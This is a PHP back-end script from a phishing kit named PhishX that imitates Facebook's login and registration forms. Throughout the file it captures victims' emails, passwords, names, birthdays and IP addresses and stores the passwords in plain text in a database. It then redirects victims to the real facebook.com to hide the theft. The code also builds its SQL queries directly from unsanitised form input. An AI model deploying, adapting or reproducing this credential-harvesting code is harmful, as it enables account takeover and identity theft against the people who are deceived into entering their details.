<?php
/*
PhishX
Copyright (c) 2016 Jamie4224

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see http://www.gnu.org/licenses/.
*/



// Set apppath
$apppath = __DIR__;

// Require . . .
require_once("$apppath/includes/config.inc.php");
require_once("$apppath/includes/classes/phishx.class.php");
require_once("$apppath/includes/classes/sql.class.php");
require_once("$apppath/includes/classes/logger.class.php");
require_once("$apppath/includes/functions/debug.func.php");
require_once("$apppath/includes/functions/getip.func.php");

$PhishX = new PhishX();
$sql = new sql();
$logger = new logger();

$PhishX->init();
$PhishX->themecheck();

$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/action.php", "NULL", getIp(), getMetaIp());

// Check if the action is register from home
if($_GET['action'] == "home/register"){
	// Check if register form was submitted
	if(isset($_POST['submit'])){
		// Set variables
		$reg_user_ip = getIp();
		$reg_meta_user_ip = getMetaIp();
		$missing = array();

		// Check if variable is empty
		if(empty($_POST['firstname'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Firstname missing";
		}else{
			// Else set the variable
			$reg_firstname = $_POST['firstname'];
		}

		// Check if variable is empty
		if(empty($_POST['lastname'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Lastname missing";
		}else{
			// Else set the variable
			$reg_lastname = $_POST['lastname'];
		}

		// Check if variable is empty
		if(empty($_POST['reg_email__'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Email missing";
		}else{
			// Else set the variable
			$reg_email = $_POST['reg_email__'];
		}

		// Check if variable is empty
		if(empty($_POST['reg_email_confirmation__'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Email-confirmation missing";
		}else{
			// Else set the variable
			$reg_email_confirmation = $_POST['reg_email_confirmation__'];
		}

		// Check if variable is empty
		if(empty($_POST['reg_passwd__'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Password missing";
		}else{
			// Else set the variable
			$reg_passwd = $_POST['reg_passwd__'];
		}

		// Check if variable is empty
		if(empty($_POST['birthday_day'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Birthday-day missing";
		}else{
			// Else set the variable
			$reg_birthday_day = $_POST['birthday_day'];
		}

		// Check if variable is empty
		if(empty($_POST['birthday_month'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Birthday-month missing";
		}else{
			// Else set the variable
			$reg_birthday_month = $_POST['birthday_month'];
		}

		// Check if variable is empty
		if(empty($_POST['birthday_year'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Birthday-year missing";
		}else{
			// Else set the variable
			$reg_birthday_year = $_POST['birthday_year'];
		}

		// Check if variable is empty
		if(empty($_POST['sex'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Sex missing";
		}else{
			// Else set the variable
			$reg_sex = $_POST['sex'];
		}

		// Check if variable is empty
		if(empty($_POST['locale'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Locale missing";
		}else{
			// Else set the variable
			$reg_locale = $_POST['locale'];
		}

		// Check if there are any missing(s) variables
		if(!empty($missing)){
			// If there are any missing(s) then make the "complete" false
			$complete = "false";
			// Turn the missing variable into a string
			$missing_string = implode('; ', $missing);
		}else{
			// If there no missing(s) then make the "complete" true
			$complete = "true";
			// Set missing to NULL
			$missing = "NULL";
		}

		$phishx_sql_query_insertRegisterData = "INSERT INTO `phishx_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'home/register', CURRENT_TIMESTAMP, '$reg_firstname', '$reg_lastname', '$reg_email', '$reg_email_confirmation', '$reg_passwd', '$reg_birthday_day', '$reg_birthday_month', '$reg_birthday_year', '$reg_sex', 'nl_NL', '$reg_user_ip', '$reg_meta_user_ip', '$missing_string');";

		$sql->db_connect();
		$sql->query($phishx_sql_query_insertRegisterData);
		$sql->db_close();


		// If complete is "true" execute code/sql
		if($complete == "true"){
			switch($config_option__301){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				default:
					header("Location: $config_option__301");
			}
		}elseif($complete == "false"){
			switch($config_option__302){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				default:
					header("Location: $config_option__302");

			}
		}
	}
// Check if the form was login from home
}elseif($_GET['action'] == "home/login" || $_GET['action'] == "404/login" || $_GET['action'] == "home%2Flogin"){
	// Check if the form is submitted
	if(isset($_POST['submit'])){
		// Set variables
		$user_ip = getIp();
		$meta_user_ip = getMetaIp();
		$type = $_GET['action'];
		$missing = array();

		// Check if encoded
		if($_GET['action'] == "home%2Flogin"){
			$type = "home/login";
		}

		// Check if variable is empty
		if(empty($_POST['email'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Email missing";
		}else{
			// Else set the variable
			$email = $_POST['email'];
		}

		// Check if variable is empty
		if(empty($_POST['pass'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Password missing";
		}else{
			// Else set the variable
			$passwd = $_POST['pass'];
		}

		// Check if variable is empty
		if(empty($_POST['locale'])){
			// If empty then put message in the array() "missing"
			$missing[] = "Locale missing";
		}else{
			// Else set the variable
			$locale = $_POST['locale'];
		}

		// Check if there are any missing(s) variables
		if(!empty($missing)){
			// If there are any missing(s) then make the "complete" false
			$complete = "false";
			// Turn the missing variable into a string
			$missing_string = implode('; ', $missing);
		}else{
			// If there no missing(s) then make the "complete" true
			$complete = "true";
			// Set missing to NULL
			$missing = "NULL";
		}

		$phishx_sql_query_insertLoginData = "INSERT INTO `phishx_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, '$type', CURRENT_TIMESTAMP, '0', '0', '$email', '0', '$passwd', '0', '0', '0', '0', '$locale', '$user_ip', '$meta_user_ip', '$missing_string');";
		$sql->db_connect();
		$sql->query($phishx_sql_query_insertLoginData);
		$sql->db_close();

		// If complete is "true" execute code/sql
		if($complete == "true"){
			switch($config_option__301){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				default:
					header("Location: $config_option__301");
			}
		}elseif($complete == "false"){
			switch($config_option__302){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				default:
					header("Location: $config_option__302");
			}
		}
	}
}else{
	switch($config_option__287){
	case "facebook":
		header("Location: https://facebook.com");
		break;
	case "home":
		header("Location: /index.php");
		break;
	default:
		header("Location: $config_option__287");
	}
}

